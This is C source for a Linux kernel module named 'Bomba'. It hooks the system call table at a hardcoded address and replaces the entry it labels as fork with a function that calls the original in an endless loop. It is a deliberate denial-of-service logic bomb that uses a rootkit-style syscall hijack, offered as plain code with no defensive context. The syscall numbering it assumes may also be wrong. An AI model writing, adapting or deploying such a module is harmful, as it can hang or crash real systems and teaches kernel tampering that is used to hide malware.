#include <linux/module.h> 
#include <linux/kernel.h> 
#include <asm/unistd.h> 
#include <asm/fcntl.h> 
#include <asm/errno.h> 
#include <linux/types.h> 
#include <linux/dirent.h> 
#include <linux/string.h> 
#include <linux/fs.h> 
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/highmem.h>
#include <asm/unistd.h>
#include "rw.h"
MODULE_LICENSE("GPL");
#include "syscall.h"

#define fork_code 40

int (*orig_syscall)(void); /*the original systemcall*/ 
const unsigned long** sys_call_table = (const unsigned long**)0xffffffff81801460;

// This kills the crab.
int replace_syscall(void) {
	printk("BOOM\n");
	while(1)
		orig_syscall();	
	printk("END REPLACEMENT CALL\n");
	return 0;
}

int init_module() {
	printk("Bomba initializing...\n");
	make_rw(sys_call_table);
	orig_syscall = sys_call_table[fork_code];
	sys_call_table[fork_code] = replace_syscall;
	printk("Bomba ready to blow...\n");
	return 0;
}

void cleanup_module() {
	sys_call_table[fork_code] = orig_syscall;
	printk(KERN_INFO "Bomba defused\n");
}
